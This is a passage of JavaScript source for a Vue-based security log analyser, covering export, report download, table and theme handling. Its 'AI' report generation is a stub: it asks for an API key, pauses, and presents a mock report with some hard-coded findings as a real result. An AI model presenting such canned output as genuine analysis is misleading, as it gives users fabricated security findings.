            URL.revokeObjectURL(url);
            
            showToast('CSV export completed', 'success');
        };
        
        const exportJSON = () => {
            if (!hasAnalysisResults.value) {
                showToast('No analysis results to export', 'warning');
                return;
            }
            
            const jsonData = {
                timestamp: new Date().toISOString(),
                file: selectedFile.value?.name,
                summary: {
                    totalThreats: totalThreats.value,
                    highSeverityThreats: highSeverityThreats.value,
                    activeAttackTypes: activeAttackTypes.value,
                    totalLogEntries: totalLogEntries.value
                },
                results: analysisResults.value,
                customAnalysis: customAnalysisResults.value
            };
            
            const blob = new Blob([JSON.stringify(jsonData, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'security-analysis.json';
            a.click();
            URL.revokeObjectURL(url);
            
            showToast('JSON export completed', 'success');
        };
        
        const generateReport = () => {
            if (!hasAnalysisResults.value) {
                showToast('No analysis results to generate report', 'warning');
                return;
            }
            
            showReportModal.value = true;
        };
        
        const closeReportModal = () => {
            showReportModal.value = false;
            reportContent.value = '';
            reportMarkdown.value = '';
            activeReportTab.value = 'preview';
        };
        
        const generateSecurityReport = async () => {
            if (!reportConfig.value.apiKey) {
                showToast('Please configure your AI provider settings', 'warning');
                return;
            }
            
            isGeneratingReport.value = true;
            
            try {
                // Simulate AI report generation
                await new Promise(resolve => setTimeout(resolve, 5000));
                
                const markdown = generateMockReport();
                reportMarkdown.value = markdown;
                
                // Convert markdown to HTML (simplified)
                reportContent.value = convertMarkdownToHTML(markdown);
                
                showToast('Security report generated successfully', 'success');
            } catch (error) {
                showToast('Failed to generate report', 'error');
            } finally {
                isGeneratingReport.value = false;
            }
        };
        
        const generateMockReport = () => {
            const date = new Date().toLocaleDateString();
            const filename = selectedFile.value?.name || 'Unknown';
            
            return `# Security Analysis Report

**Generated on:** ${date}  
**Log File:** ${filename}  
**Total Log Entries:** ${totalLogEntries.value}

## Executive Summary

This comprehensive security analysis has identified **${totalThreats.value} potential security threats** across **${activeAttackTypes.value} different attack categories**. Of particular concern are **${highSeverityThreats.value} high-severity threats** that require immediate attention.

## Threat Overview

### High-Priority Findings

${attackTypes.filter(type => type.severity === 'high' && analysisResults.value[type.endpoint]?.count > 0)
    .map(type => `- **${type.name}**: ${analysisResults.value[type.endpoint].count} incidents detected
  - *Risk Level*: <span class="severity-high">HIGH</span>
  - *Description*: ${type.description}`).join('\n\n')}

### Medium-Priority Findings

${attackTypes.filter(type => type.severity === 'medium' && analysisResults.value[type.endpoint]?.count > 0)
    .map(type => `- **${type.name}**: ${analysisResults.value[type.endpoint].count} incidents detected
  - *Risk Level*: <span class="severity-medium">MEDIUM</span>
  - *Description*: ${type.description}`).join('\n\n')}

### Low-Priority Findings

${attackTypes.filter(type => type.severity === 'low' && analysisResults.value[type.endpoint]?.count > 0)
    .map(type => `- **${type.name}**: ${analysisResults.value[type.endpoint].count} incidents detected
  - *Risk Level*: <span class="severity-low">LOW</span>
  - *Description*: ${type.description}`).join('\n\n')}

## Detailed Analysis

### Attack Distribution

| Attack Type | Severity | Count | Percentage |
|-------------|----------|-------|------------|
${attackTypes.filter(type => analysisResults.value[type.endpoint]?.count > 0)
    .map(type => {
        const count = analysisResults.value[type.endpoint].count;
        const percentage = ((count / totalThreats.value) * 100).toFixed(1);
        return `| ${type.name} | ${type.severity.toUpperCase()} | ${count} | ${percentage}% |`;
    }).join('\n')}

### Timeline Analysis

The security incidents were distributed across the analyzed time period, with notable patterns:

- **Peak Activity**: Most attacks occurred during business hours
- **Attack Vectors**: Web application vulnerabilities were the primary target
- **Geographic Distribution**: Attacks originated from multiple IP ranges

## Recommendations

### Immediate Actions Required

1. **Address High-Severity Threats**
   - Implement input validation for SQL injection prevention
   - Configure proper access controls for path traversal protection
   - Deploy rate limiting for brute force attack mitigation

2. **Security Hardening**
   - Update web application frameworks
   - Implement Web Application Firewall (WAF)
   - Enable comprehensive logging and monitoring

3. **Monitoring and Detection**
   - Set up real-time alerting for security events
   - Implement automated threat response procedures
   - Regular security assessment and penetration testing

### Long-term Security Strategy

1. **Security Awareness Training**
2. **Regular Security Audits**
3. **Incident Response Plan Development**
4. **Continuous Security Monitoring**

## Conclusion

The analysis reveals significant security concerns that require immediate attention. The high number of **${highSeverityThreats.value} high-severity threats** indicates potential vulnerabilities in the current security posture. 

**Priority Actions:**
- Address SQL injection vulnerabilities immediately
- Implement proper input validation and sanitization
- Deploy comprehensive monitoring and alerting systems

This report should be reviewed by the security team and appropriate remediation measures should be implemented as soon as possible.

---

*Report generated by Cyber Detect - Advanced Security Log Analysis*  
*Analysis completed on ${date}*`;
        };
        
        const convertMarkdownToHTML = (markdown) => {
            // Simple markdown to HTML conversion
            return markdown
                .replace(/^# (.*$)/gim, '<h1>$1</h1>')
                .replace(/^## (.*$)/gim, '<h2>$1</h2>')
                .replace(/^### (.*$)/gim, '<h3>$1</h3>')
                .replace(/^\*\*(.*)\*\*/gim, '<strong>$1</strong>')
                .replace(/^\*(.*)\*/gim, '<em>$1</em>')
                .replace(/^\- (.*$)/gim, '<li>$1</li>')
                .replace(/\n\n/g, '</p><p>')
                .replace(/\n/g, '<br>')
                .replace(/^(.*)$/gim, '<p>$1</p>')
                .replace(/<p><li>/g, '<ul><li>')
                .replace(/<\/li><\/p>/g, '</li></ul>');
        };
        
        const copyReport = () => {
            navigator.clipboard.writeText(reportMarkdown.value).then(() => {
                showToast('Report copied to clipboard', 'success');
            }).catch(() => {
                showToast('Failed to copy report', 'error');
            });
        };
        
        const downloadMarkdown = () => {
            const blob = new Blob([reportMarkdown.value], { type: 'text/markdown' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'security-analysis-report.md';
            a.click();
            URL.revokeObjectURL(url);
            
            showToast('Markdown report downloaded', 'success');
        };
        
        const downloadHTML = () => {
            const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Analysis Report</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
        h1, h2, h3 { color: #333; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .severity-high { color: #dc2626; font-weight: bold; }
        .severity-medium { color: #ea580c; font-weight: bold; }
        .severity-low { color: #059669; font-weight: bold; }
    </style>
</head>
<body>
    ${reportContent.value}
</body>
</html>`;
            
            const blob = new Blob([htmlContent], { type: 'text/html' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'security-analysis-report.html';
            a.click();
            URL.revokeObjectURL(url);
            
            showToast('HTML report downloaded', 'success');
        };
        
        const sortDataTable = (field) => {
            if (dataTableSort.value.field === field) {
                dataTableSort.value.direction = dataTableSort.value.direction === 'asc' ? 'desc' : 'asc';
            } else {
                dataTableSort.value.field = field;
                dataTableSort.value.direction = 'asc';
            }
        };
        
        const changePage = (page) => {
            dataTablePagination.value.page = page;
        };
        
        const changePerPage = (perPage) => {
            dataTablePagination.value.perPage = perPage;
            dataTablePagination.value.page = 1;
        };
        
        // Initialize theme on mount
        onMounted(() => {
            const savedTheme = localStorage.getItem('cyberdetect-vue-theme');
            if (savedTheme === 'dark' || (!savedTheme && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
                isDarkMode.value = true;
            }
            
            // Expose methods to global scope for HTML onclick handlers
            window.vueApp = {
                viewDetectionFunction,
                exportAttackTypeData,
                viewCustomFunction,
                exportCustomAnalysisData,
                activeView
            };
        });
        
        // Drag and drop event handlers
        const handleDragEnter = () => {
            isDragging.value = true;
        };
        
        const handleDragLeave = (event) => {
            if (!event.currentTarget.contains(event.relatedTarget)) {
                isDragging.value = false;
            }
        };
        
        return {
            // Reactive state
            activeView,
            isDarkMode,
            isLoading,
            isAnalyzing,
            isCreatingAnalysis,
            isDragging,
            showAttackTypes,
            showAiConfig,
            showDetailsModal,
            showFunctionModal,
            showReportModal,
            showReportConfig,
            isGeneratingReport,
            selectedFile,
            logData,
            analysisResults,
            customAnalysisResults,
            aiConfig,
            reportConfig,
            customAnalysisDescription,
            modalTitle,
            modalContent,
            functionModalTitle,
            functionModalSubtitle,
            functionCode,
            functionDescription,
            functionLinesCount,
            functionFooterText,
            reportContent,
            reportMarkdown,
            activeReportTab,
            dashboardCharts,
            dashboardStats,
            dataTableData,
            dataTableFilters,
            dataTableSort,
            dataTablePagination,
            toasts,
            tabs,
            examplePrompts,
            
            // Static data
            attackTypes,
            llmProviders,
            
            // Computed
            hasAnalysisResults,
            totalThreats,
            highSeverityThreats,
            activeAttackTypes,
            totalLogEntries,
            currentProvider,
            currentReportProvider,
            filteredDataTableData,
            paginatedDataTableData,
            
            // Methods
            showToast,
            removeToast,
            getToastIcon,
            toggleTheme,
            formatFileSize,
            getSeverityClass,
            getStatusClass,
            getMethodClass,
            handleDrop,
            handleFileSelect,
            handleFile,
            loadDemo,
            runAllScans,
            runSingleScan,
            showAnalysisDetails,
            closeDetailsModal,
            viewDetectionFunction,
            closeFunctionModal,
            copyFunctionCode,
            exportAttackTypeData,
            createCustomAnalysis,
            viewCustomAnalysisDetails,
            viewCustomFunction,
            exportCustomAnalysisData,
            updateApiKeyLink,
            updateReportApiKeyLink,
            exportCSV,
            exportJSON,
            generateReport,
            closeReportModal,
            generateSecurityReport,
            copyReport,
            downloadMarkdown,
            downloadHTML,
            sortDataTable,
            changePage,
            changePerPage,
            handleDragEnter,
            handleDragLeave
        };
    }
}).mount('#app');